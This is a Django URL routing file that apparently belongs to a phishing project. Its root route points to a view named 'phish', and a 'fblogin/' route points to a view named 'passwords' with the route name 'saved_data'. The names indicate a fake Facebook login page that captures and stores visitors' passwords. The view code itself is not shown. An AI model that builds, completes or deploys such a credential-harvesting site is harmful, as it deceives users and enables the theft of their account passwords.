from django.conf.urls import url
from django.contrib import admin
from django.urls import path
from . import views


urlpatterns = [
    path('', views.phish,name="Phishing"),
    path('fblogin/', views.passwords,name="saved_data")
]